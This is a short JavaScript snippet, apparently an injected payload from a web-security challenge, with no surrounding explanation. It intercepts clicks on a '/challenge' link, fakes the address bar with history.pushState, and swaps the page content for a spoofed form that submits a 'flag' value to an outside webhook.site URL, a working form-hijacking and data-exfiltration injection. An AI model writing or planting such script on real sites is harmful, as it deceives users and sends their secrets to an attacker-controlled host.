
(() => {
    const link = document.querySelector('a[href="/challenge"]');
    if (!link) return;

    link.addEventListener('click', e => {
        e.preventDefault();
        e.stopImmediatePropagation();

        history.pushState({}, '', '/challenge');

        document.querySelector('.content').innerHTML = `
            <fieldset>
                <form action="https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04" method="GET">
                    <input name="flag">
                    <input type="hidden" name="id" value="1">
                    <input type="submit">
                </form>
            </fieldset>
        `;
    }, true);
})();
